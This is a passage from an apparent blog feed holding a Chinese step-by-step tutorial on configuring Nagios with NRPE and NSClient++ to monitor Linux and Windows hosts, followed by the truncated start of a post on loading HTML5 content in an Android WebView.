# make &amp;&amp; make install</span></pre>

</div>

<p><span>这一步完成后会在</span><span lang="EN-US">/usr/local/nagios/</span><span>下生成三个目录include、</span><span lang="EN-US">libexec</span><span>和</span><span lang="EN-US">share。</span></p>

</div>




<div align="left"><img style="line-height: 1.5;" src="http://images.cnitblog.com/blog/370046/201302/02152814-8ad7b743e94d47e4a273d26f17fc039b.jpg" alt="" /><span style="line-height: 1.5;">&nbsp;</span></div>




<p>修改目录权限</p>




<div class="cnblogs_code">

<pre><span style="color: #000000;"># chown nagios.nagios /usr/local/nagios

# chown -R nagios.nagios /usr/local/nagios/libexec</span></pre>

</div>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02152955-bba448f8c550421199e95f5abcd2a367.jpg" alt="" /></p>




<p><span>c. 安装NRPE</span></p>




<div class="cnblogs_code">

<pre><span style="color: #000000;"># wget http://prdownloads.sourceforge.net/sourceforge/nagios/nrpe-2.13.tar.gz

# tar zxvf nrpe-2.13.tar.gz

# cd nrpe-2.13

# ./configure</span></pre>

</div>




<p><span><img src="http://images.cnitblog.com/blog/370046/201302/02153432-514737688d5e44c981423882673c6842.jpg" alt="" /></span></p>




<div class="cnblogs_code">

<pre># make all</pre>

</div>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02153525-60524407b4d44378a546bbe0bec82bb9.jpg" alt="" /></p>




<p>接下来安装NPRE插件，daemon和示例配置文件。</p>




<p>c.1 安装check_nrpe 这个插件</p>




<p># make install-plugin</p>




<p>监控机需要安装check_nrpe 这个插件，被监控机并不需要，我们在这里安装它只是为了测试目的。</p>




<p>c.2 安装deamon</p>




<p># make install-daemon</p>




<p>c.3 安装配置文件</p>




<p># make install-daemon-config</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02153951-c1778a148ed74b088fee4ada04aa3512.jpg" alt="" /></p>




<p>现在再查看nagios 目录就会发现有5个目录了</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02154106-69cd13fa72dc49d09132a4c981443559.jpg" alt="" /></p>




<p>按照安装文档的说明，是将NRPE deamon作为xinetd下的一个服务运行的。在这样的情况下xinetd就必须要先安装好，不过一般系统已经默认安装了。</p>




<p>d. 安装xinted 脚本</p>




<p># make install-xinetd</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02154307-bee4a49f8d87420a87899cd9c840c6d9.jpg" alt="" /></p>




<p><span>可以看到创建了这个文件</span><span lang="EN-US">/etc/xinetd.d/nrpe。</span></p>




<p><span lang="EN-US">编辑这个脚本：</span></p>




<p><span lang="EN-US"><img src="http://images.cnitblog.com/blog/370046/201302/02154418-5de6ef5ff71e42469c240fa9f9402ce1.jpg" alt="" /></span></p>




<p><span lang="EN-US">在only_from 后增加监控主机的IP地址。</span></p>




<p>编辑/etc/services 文件，增加NRPE服务</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02155336-8586723f931c4fffb70c1cc1c3a3f4dc.jpg" alt="" /></p>




<p>重启xinted 服务</p>




<p># service xinetd restart</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02155344-580e8616185d4aa0b984b151955ee330.jpg" alt="" /></p>




<p>查看NRPE 是否已经启动</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02155355-6fb6cb5dcf844d09b48dfddd988d8c5d.jpg" alt="" /></p>




<p><span>可以看到</span><span lang="EN-US">5666</span><span>端口已经在监听了。</span></p>




<p>e. 测试<span lang="EN-US">NRPE</span>是否则正常工作</p>




<p>使用上面在被监控机上安装的check_nrpe 这个插件测试NRPE 是否工作正常。</p>




<p># /usr/local/nagios/libexec/check_nrpe -H localhost</p>




<p>会返回当前NRPE的版本</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02160042-6ae7c0101c264ff8b8076192ace36a23.jpg" alt="" /></p>




<p>也就是在本地用check_nrpe连接nrpe daemon是正常的。</p>




<p>注：为了后面工作的顺利进行，注意本地防火墙要打开5666能让外部的监控机访问。</p>




<p>f. check_nrpe 命令用法</p>




<p>查看check_nrpe 命令用法</p>




<p># /usr/local/nagios/libexec/check_nrpe &ndash;h</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02161053-48f17806b6904b5688d61870a2ad0232.jpg" alt="" /></p>




<p>可以看到用法是：</p>




<p>check_nrpe &ndash;H 被监控的主机 -c 要执行的监控命令</p>




<p>注意：-c 后面接的监控命令必须是nrpe.cfg 文件中定义的。也就是NRPE daemon只运行nrpe.cfg中所定义的命令。</p>




<p>g.&nbsp;查看NRPE的监控命令</p>




<p># cd /usr/local/nagios/etc</p>




<p># cat nrpe.cfg |grep -v &#8220;^#&#8221;|grep -v &#8220;^$&#8221;</p>




<div class="cnblogs_code">

<pre><span style="color: #000000;">[root@Nagiso-Linux etc]# cat nrpe.cfg |grep -v "^#"|grep -v "^$"

log_facility=daemon

pid_file=/var/run/nrpe.pid

server_port=5666

nrpe_user=nagios

nrpe_group=nagios

allowed_hosts=127.0.0.1

 

dont_blame_nrpe=0

debug=0

command_timeout=60

connection_timeout=300

command[<span style="color: #ff0000;">check_users</span>]=/usr/local/nagios/libexec/check_users -w 5 -c 10

command[<span style="color: #ff0000;">check_load</span>]=/usr/local/nagios/libexec/check_load -w 15,10,5 -c 30,25,20

command[<span style="color: #ff0000;">check_sda1</span>]=/usr/local/nagios/libexec/check_disk -w 20% -c 10% -p /dev/sda1

command[<span style="color: #ff0000;">check_zombie_procs</span>]=/usr/local/nagios/libexec/check_procs -w 5 -c 10 -s Z

command[<span style="color: #ff0000;">check_total_procs</span>]=/usr/local/nagios/libexec/check_procs -w 150 -c 200 

[root@Nagiso-Linux etc]# </span></pre>

</div>




<p>红色部分是命令名，也就是check_nrpe 的-c 参数可以接的内容，等号 &ldquo;=&rdquo; 后面是实际执行的插件程序（这与commands.cfg 中定义命令的形式十分相似，只不过是写在了一行）。也就是说check_users 就是等号后面/usr/local/nagios/libexec/check_users -w 5 -c 10 的简称。</p>




<p>我们可以很容易知道上面这5行定义的命令分别是检测登陆用户数，cpu负载，sda1的容量，僵尸进程，总进程数。各条命令具体的含义见插件用法（执行&ldquo;插件程序名 &ndash;h&rdquo;）。</p>




<p>由于-c 后面只能接nrpe.cfg 中定义的命令，也就是说现在我们只能用上面定义的这五条命令。我们可以在本机实验一下。</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02162617-1c0b8b7a4b554f58903459594c7c1e5c.jpg" alt="" width="900" /></p>




<p>9.3 在监控主机（Nagios-Server）上</p>




<p>之前已经将Nagios运行起来了，现在要做的事情是：</p>




<ul>

<li>安装check_nrpe 插件；</li>

<li>在commands.cfg 中创建check_nrpe 的命令定义，因为只有在commands.cfg 中定义过的命令才能在services.cfg 中使用；</li>

<li>创建对被监控主机的监控项目；</li>

</ul>




<p>9.3.1 安装check_nrpe 插件</p>




<div class="cnblogs_code">

<pre><span style="color: #000000;"># tar zxvf nrpe-2.13.tar.gz 

# cd nrpe-2.13

# ./configure

# make all

# make install-plugin</span></pre>

</div>




<p><span>只运行这一步就行了，</span><span>因为只需要</span><span lang="EN-US">check_nrpe</span><span>插件。</span></p>




<p>在Nagios-Linux 上我们已经装好了nrpe，现在我们测试一下监控机使用check_nrpe 与被监控机运行的nrpe daemon之间的通信。</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02165718-6aa53e921dc2432a9738a5638aaa17e3.jpg" alt="" /></p>




<p>看到已经正确返回了NRPE的版本信息，说明一切正常。</p>




<p>9.3.2&nbsp;在<span lang="EN-US">commands.cfg</span>中增加对<span lang="EN-US">check_nrpe</span>的定义</p>




<p># vi&nbsp;/usr/local/nagios/etc/objects/commands.cfg</p>




<p><span>在最后面增加如下内容：</span></p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02170218-5800896bf01e45f5b781a1f46ce2efb5.jpg" alt="" /></p>




<p>意义如下：</p>




<div class="cnblogs_code">

<pre><span style="color: #000000;"># 'check_nrpe' command definition

define command{

        command_name    check_nrpe         # <span>定义命令名称为</span><span lang="EN-US">check_nrpe,</span><span>在</span><span lang="EN-US">services.cfg</span><span>中要使用这个名称</span><span lang="EN-US">.</span>

        command_line    $USER1$/check_nrpe -H $HOSTADDRESS$ -c $ARG1$       #<span>这是定义实际运行的插件程序</span><span lang="EN-US">.<br /></span><span>                        # 这个命令行的书写要完全按照</span><span lang="EN-US">check_nrpe</span><span>这个命令的用法,</span><span>不知道用法的就用</span><span lang="EN-US">check_nrpe &ndash;h</span><span>查看.</span>

        }</span></pre>

</div>




<div align="left">

<p>-c 后面带的$ARG1$ 参数是传给nrpe daemon 执行的检测命令，之前说过了它必须是nrpe.cfg 中所定义的那5条命令中的其中一条。在services.cfg 中使用check_nrpe 的时候要用 &ldquo;!&rdquo; 带上这个参数。</p>

<p>9.3.3 定义对Nagios-Linux 主机的监控</p>

<p>下面就可以在services.cfg 中定义对Nagios-Linux 主机的监控了。</p>

<div class="cnblogs_code">

<pre><span style="color: #000000;">define service{

        use                     local-service

        host_name               Nagios-Linux

        service_description     Current Load

        check_command           check_nrpe!check_load

        }



define service{

        use                     local-service

        host_name               Nagios-Linux

        service_description     Check Disk sda1

        check_command           check_nrpe!check_sda1

        }



define service{

        use                     local-service

        host_name               Nagios-Linux

        service_description     Total Processes

        check_command           check_nrpe!check_total_procs

        }



define service{

        use                     local-service

        host_name               Nagios-Linux

        service_description     Current Users

        check_command           check_nrpe!check_users

        }



define service{

        use                     local-service

        host_name               Nagios-Linux

        service_description     Check Zombie Procs

        check_command           check_nrpe!check_zombie_procs

        }</span></pre>

</div>

<p>还有一个任务是要监控Nagios-Linux 的swap 使用情况。但是在nrpe.cfg 中默认没有定义这个监控功能的命令。怎么办？手动在nrpe.cfg 中添加，也就是自定义NRPE命令。</p>

<p>现在我们要监控swap 分区，如果空闲空间小于20%则为警告状态 -&gt; warning；如果小于10%则为严重状态 -&gt; critical。我们可以查得需要使用check_swap插件，完整的命令行应该是下面这样。</p>

<p># /usr/local/nagios/libexec/check_swap -w 20% -c 10%<br /> <br />在被监控机（Nagios-Linux）上增加check_swap 命令的定义</p>

<p># vi /usr/local/nagios/etc/nrpe.cfg</p>

<p>增加下面这一行</p>

<p>command[check_swap]=/usr/local/nagios/libexec/check_swap -w 20% -c 10%</p>

<p>我们知道check_swap 现在就可以作为check_nrpe 的-c 的参数使用了</p>

<p>修改了配置文件，当然要重启。</p>

<p>如果你是以独立的daemon运行的nrpe，那么需要手动重启；如果你是在xinetd 下面运行的，则不需要。</p>

<p>由于本实验中nrpe 是xinetd 下运行的，所以不需要重启服务。<br /> <br />在监控机（Nagios-Server）上增加这个check_swap 监控项目</p>

<div class="cnblogs_code">

<pre><span style="color: #000000;">define service{

        use                     local-service

        host_name               Nagios-Linux

        service_description     Check Swap

        check_command           check_nrpe!check_swap

        }</span></pre>

</div>

<p>同理，Nagios-Linux 上我还开启了http 服务，需要监控一下，按照上面的做法，在被监控机（Nagios-Linux）上增加check_http 命令的定义</p>

<p># vi /usr/local/nagios/etc/nrpe.cfg</p>

<p>增加下面这一行</p>

<p>command[check_http]=/usr/local/nagios/libexec/check_http&nbsp;-I 127.0.0.1</p>

<p>在监控机（Nagios-Server）上增加check_http 监控项目</p>

<div class="cnblogs_code">

<pre><span style="color: #000000;">define service{

        use                     local-service

        host_name               Nagios-Linux

        service_description     HTTP

        check_command           check_nrpe!check_http

        }</span></pre>

</div>

<p>所有的配置文件已经修改好了，现在重启Nagios。</p>

<p># service nagios restart</p>

<p>9.3.4 查看配置情况</p>

<p>登录Nagios Web监控页<a href="http://172.16.1.124/nagios/">http://192.168.1.108/nagios/</a>&nbsp;查看相关信息。</p>

<p><img src="http://images.cnitblog.com/blog/370046/201302/02184124-51bf1a34b0fb45deb5f9f8cc3762b24b.jpg" alt="" width="900" /></p>

<p>可以看到，对于Nagios-Server 和Nagios-Linux 上的相关服务的监控已经成功了，还有Nagios-Windows 上的服务还没有定义，下面讲到。</p>

</div>




<p><span style="font-size: 16px;"><strong><span style="color: #800000;">十、利用NSClient++监控远程Windows上的&ldquo;本地信息&rdquo;</span></strong></span></p>




<p><span><span>在Nagios的libexec下有check_nt这个插件，它就是用来检查windows机器的服务的。其功能类似于check_nrpe。不过还需要搭配另外一个软件NSClient++，它则类似于NRPE。</span></span></p>




<p><span><span><span lang="EN-US">NSClient++</span><span>的原理如下图</span></span></span></p>




<p><img src="http://images.cnitblog.com/blog/370046/201301/30220738-30882fabacfb4e27b78d1f033457ed66.png" alt="" /></p>




<p>可以看到NSClient与nrpe最大的区别就是：</p>




<ul>

<li>被监控机上安装有nrpe，并且还有插件，最终的监控是由这些插件来进行的。当监控主机将监控请求发给nrpe后，nrpe调用插件来完成监控。</li>

<li>NSClient++则不同，被监控机上只安装NSClient，没有任何的插件。当监控主机将监控请求发给NSClient++后，NSClient直接完成监控，所有的监控是由NSClient完成的。</li>

</ul>




<p>这也说明了NSClient++的一个很大的问题：不灵活、没有可扩展性。它只能完成自己本身包含的监控操作，不能由一些插件来扩展。好在NSClient++已经做的不错了，基本上可以完全满足我们的监控需求。</p>




<p>10.1 安装NSClient++</p>




<p>从http://www.nsclient.org/nscp/downloads 下载NSClient++-0.2.7.zip<span><br /></span></p>




<p><span><span>解压到C盘根目录。</span><span lang="EN-US"><br /></span></span></p>




<p><span>打开</span><span lang="EN-US">cmd&nbsp;</span><span>切换到c</span><span lang="EN-US">:\NSClient++-0.2.7</span></p>




<p><span lang="EN-US"><span>执行</span><span lang="EN-US">nsclient++ /install&nbsp;</span><span>进行安装</span></span></p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02222453-f97392fad0d34a4eb1cb9fedccc6c2ee.jpg" alt="" /></p>




<p><span>执行</span><span lang="EN-US">nsclient++ SysTray （</span><span>注意大小写），</span><span>这一步是安装系统托盘，</span><span>时间稍微有点长。</span></p>




<p><span><img src="http://images.cnitblog.com/blog/370046/201302/02222739-b0076ad25fbe40d99ff7094f43418657.jpg" alt="" /></span></p>




<div align="left"><span style="line-height: 1.5;">在运行里面输入</span><span style="line-height: 1.5;" lang="EN-US">services.msc&nbsp;</span><span style="line-height: 1.5;">打开&ldquo;</span><span style="line-height: 1.5;">服务</span><span style="line-height: 1.5;" lang="EN-US">&rdquo;</span></div>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02222826-55f5e345f2784ba0b56b7b7b0662ac3e.jpg" alt="" />&nbsp;</p>




<p><span style="line-height: 1.5;">看到下图就说明</span><span style="line-height: 1.5;" lang="EN-US">NSClient</span><span style="line-height: 1.5;">服务已经安装上了</span></p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02222842-718e9a7851a348809b4d00244e369544.jpg" alt="" />&nbsp;</p>




<p><span><span>双击打开，</span><span>点&ldquo;</span><span>登录&rdquo;</span><span>标签，</span><span>在&ldquo;</span><span>允许服务与桌面交互</span><span lang="EN-US">&rdquo;</span><span>前打勾。</span></span></p>




<p><span><span><img src="http://images.cnitblog.com/blog/370046/201302/02222955-6dd9e31b131b4bc2a137f46dda09e8b1.jpg" alt="" /></span></span></p>




<p>编辑c<span lang="EN-US">:\NSClient++-0.2.7</span>下的NSC.ini文件。</p>




<p>将 [modules]部分的所有模块前面的注释都去掉，除了CheckWMI.dll 和 RemoteConfiguration.dll 这两个。</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02223212-afed475403544ea0b037fbac68395cb0.jpg" alt="" /></p>




<p>在[Settings]部分设置&#8217;password&#8217;选项来设置密码，作用是在nagios连接过来时要求提供密码。这一步是可选的，我这里设置为&#8217;123456&#8217;。</p>




<p>将[Settings]部分&#8217;allowed_hosts&#8217;选项的注释去掉，并且加上运行nagios的监控主机的IP。各IP之间以逗号相隔。这个地方是支持子网的，如果写成192.168.1.0/24则表示该子网内的所有机器都可以访问。如果这个地方是空白则表示所有的主机都可以连接上来。</p>




<p>注意是[Settings]部分的，因为[NSClient]部分也有这个选项。</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02223457-967f3fe2992b40dbb7da9d362d21f68c.jpg" alt="" /></p>




<p>必须保证[NSClient]的&#8217;port&#8217;选项并没有被注释，并且它的值是&#8217;12489&#8217;，这是NSClient的默认监听端口。</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02223617-e4deb1c31c21414eb1fda2d4547b00dd.jpg" alt="" /></p>




<p>在cmd 中执行nsclient++ /start启动服务，注意所在目录是c:\NSClient++-0.2.7</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02223713-a55666da26bb47338db68d06d04db0ff.jpg" alt="" /></p>




<p><span>这时在桌面右下角的系统托盘处会出现一个黄色的</span><span lang="EN-US">M</span><span>字样的图标</span></p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02223741-eea5809e0c0a4a75920308e0530a679e.jpg" alt="" /></p>




<p>查看服务</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02223800-aa5a5cf0f907417e804e1bf42e3ad95c.jpg" alt="" /></p>




<p>已经正常启动了。</p>




<p>注意服务默认设的是&ldquo;自动&rdquo;，也就是说是开机自动启动的。</p>




<p>在cmd 里面执行netstat &ndash;an 可以看到已经开始监听tcp的12489端口了。</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/02223852-f70c360e03204553a28086040839174d.jpg" alt="" /></p>




<p>这样外部就可以访问了吗？</p>




<p>错！</p>




<p>防火墙也要打开tcp的12489端口，否则nagios 检查此服务的时候会报错。</p>




<p>这样被监控机的配置就搞定了，它就等待nagios 发出某个监控请求，然后它执行请求将监控的结果发回到nagios监控主机上。</p>




<p>之前已经在监控主机（Nagios-Server）上对Windows 主机的监控做了配置，但是commands.cfg 中默认没有设置密码项，所以要修改一下，增加&#8221;-s 123456&#8221;，如下：</p>




<div class="cnblogs_code">

<pre><span style="color: #000000;"># 'check_nt' command definition

define command{

        command_name    check_nt

        command_line    $USER1$/check_nt -H $HOSTADDRESS$ -p 12489 <span style="color: #ff0000;">-s 123456</span> -v $ARG1$ $ARG2$

        }</span></pre>

</div>




<p>现在打开Nagios Web监控页便可查看到相关信息了。</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/03002806-934748e3f1444b44aabe7310156e23f7.jpg" alt="" width="900" /></p>




<p>可以看到有错误：NSClient - ERROR: PDH Collection thread not running.</p>




<p>Google 一下，是<span>由于操作系统语言的问题，</span><span>好像</span><span lang="EN-US">NSClient&nbsp;</span><span>默认支持的语言并不多，具体可以百度一下。</span></p>




<p><span><span>查看</span><span lang="EN-US">NSClient</span><span>的日志</span><span lang="EN-US">C:\NSClient++-0.2.7\</span><span lang="EN-US">nsclient.log，</span><span>信息如下：</span></span></p>




<div class="cnblogs_code">

<pre>2013-02-02 22:05:30: error:.\PDHCollector.cpp:98: You need to manually configure performance counters!</pre>

</div>




<p><span>需要手动配置performance counters。</span></p>




<p><span>打开C:\NSClient++-0.2.7\</span><span lang="EN-US">counters.defs</span><span>文件，</span><span>复制文件里面</span><span lang="EN-US">&#8220;English US&#8221;</span><span>那部分内容，粘贴到counters.defs 文件的最后，</span><span>修改Description = &#8220;Chinese&#8221;。</span></p>




<p><span lang="EN-US"><img src="http://images.cnitblog.com/blog/370046/201302/03003715-2d845ecd7f104003980895b758997d71.jpg" alt="" /></span></p>




<p><span>修改完之后，在mmc中重启NSClient 服务。</span></p>




<p>然后查看日志，内容如下：</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/03004023-10d2dacf5c6a4d57bbb1c723972a67bd.jpg" alt="" /></p>




<p>在正常执行了。</p>




<p>打开Nagios Web监控页查看。</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/03004313-fff4fffe267a498ea4941b5925564781.jpg" alt="" width="900" /></p>




<p>执行成功，但是W3SVC服务为Unknown 状态。查资料，需要开启Windows 的IIS服务。</p>




<p>打开&ldquo;控制面板&rdquo;进行安装。</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/03004546-b47a77a22f3440c99129b573abca1358.jpg" alt="" /></p>




<p>安装完毕后，再到Nagios Web监控页查看，全部监控正常。</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/03004705-d95839ed394c48c1a6d19ca90a3137b5.jpg" alt="" width="900" />&nbsp;</p>




<p><span style="font-size: 16px;"><strong><span style="color: #800000;">十一、Nagios邮件报警的配置</span></strong></span></p>




<p>11.1 安装sendmail 组件</p>




<p><span>首先要确保sendmail 相关组件的完整安装，我们可以使用如下的命令来完成sendmail 的安装：</span></p>




<p><span># yum install -y sendmail*<br /></span></p>




<p><span>然后重新启动sendmail服务：</span></p>




<p><span># service sendmail restart<br /></span></p>




<p><span>然后发送测试邮件，验证sendmail的可用性：</span></p>




<p><span># echo &#8220;Hello World&#8221; | mail david.tang</span><span>@bsmart.cn</span></p>




<p><span>11.2 邮件报警的配置</span></p>




<p><span>在上面我们已经简单配置过了<span>/usr/local/nagios/etc/objects/</span>contacts.cfg 文件，Nagios 会将报警邮件发送到配置文件里的E-mail 地址。</span></p>




<p><span>11.3 Nagios 通知</span></p>




<p><span>PROBLEM</span></p>




<p><span><img src="http://images.cnitblog.com/blog/370046/201302/03123045-ec847fc850c34f96bfa7bdbd60dde61f.jpg" alt="" /></span></p>




<p>RECOVERY</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/03123059-7514d44967c040b5a6146b453cba9132.jpg" alt="" /></p>




<p>Linux下Nagios安装配置完毕。&nbsp;</p>




<p>&nbsp;</p>




<p><span style="font-size: 16px;"><strong>参考资料</strong></span></p>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[使用HTML5开发Android本地应用]]></title>
    <link href="http://archulate.github.io/blog/2013/03/03/html5/"/>
    <updated>2013-03-03T17:22:01+08:00</updated>
    <id>http://archulate.github.io/blog/2013/03/03/html5</id>
    <content type="html"><![CDATA[<!--more-->


<p>HTML5是现在最热门的技术之一，Android自带的WebKit浏览器对于HTML5有着不错的支持，而各种浏览器的最新版本都开始普遍的支持HTML5。使用HTML5开发手机应用的主要好处有两个：一个是应用可以跨平台，包括不同的手机平台和PC；二是可以从服务器下载应用的内容，但是不依赖于后台Server也可以运行，可以把Web应用和本地应用更好的结合在一起。<br /></p>

<p> <br /></p>

<p>这一系列文章的目的在于研究和实验使用HTML5开发Android本地应用的优缺点和可行性，﻿包括HTML5本身的优点和局限性，网页部分和应用环境之间的交互，以及我们可以怎样控制和修改浏览器插件的行为，把它和手机本身的环境更好的结合在一起。<br /></p>

<p> <br /></p>

<p>首先是把一个WebView嵌入到应用界面中，建立起它和环境的交互，然后加载一个简单的HTML5页面。要被加载的HTML文件放在asset目录中，可以通过url &quot;file:///android_asset/index.html&quot;来加载。这个页面的作用只是用canvas画一个简单的图形。<br /></p>

<p> <br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; String path = &quot;file:///android_asset/index.html&quot;;<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; String TAG = &quot;WebClientDemo&quot;;<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; boolean isLoadResources = true;<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; WebView mWebView;<br /></p>

<br />


<p>&nbsp; &nbsp; &nbsp; &nbsp; @Override<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; public void onCreate(Bundle savedInstanceState) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; super.onCreate(savedInstanceState);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; setContentView(R.layout.webview1);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; init();<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mWebView.loadUrl(path);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<p> <br /></p>

<p>初始化WebView，设置参数，关键是设置语言为UTF-8和保证支持JavaScript<br /></p>

<p> <br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mWebView = (WebView) findViewById(R.id.myWebView1);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mWebView.setBackgroundColor(Color.WHITE);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mWebView.getSettings().setDefaultTextEncodingName(&quot;UTF-8&quot;);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mWebView.getSettings().setSupportZoom(true);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mWebView.getSettings().supportMultipleWindows();<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mWebView.getSettings().setJavaScriptEnabled(true);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mWebView.clearView();<br /></p>

<p> <br /></p>

<p>WebViewClient负责截获并修改加载网页过程中的各种事件。﻿首先给mWebView设置一个新的WebViewClient，然后重写函数shouldOverrideUrlLoading﻿。这么做的原因保证点击WebView插件中的Url链接的时候，仍然是在WebView插件中显示页面，而不是调用系统的网络浏览器。<br /></p>

<p> <br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mWebView.setWebViewClient(new WebViewClient() {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Intercepts url loading<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public boolean shouldOverrideUrlLoading(WebView view, String url) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; view.loadUrl(url);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return true;<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br /></p>

<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&hellip;<br /></p>

<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></p>

<p> <br /></p>

<p> 以下是在WebViewClient中，截获并且修改其它的事件行为的代码。例子代码中截获的事件包括网页加载前，加载后，错误，重复提交，加载资源等。比如，发生网页错误的时候，可以用自己的错误信息取代浏览器插件的错误提示。<br /></p>

<p> <br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Intercepts the resource loading events<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; @Override<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public void onLoadResource(WebView view, String url) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (!isLoadResources) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Log.i(TAG, &quot;Block resource loading:&quot; + url);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return;<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Log.i(TAG, &quot;Continue resource loading:&quot; + url);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; super.onLoadResource(view, url);<br /></p>

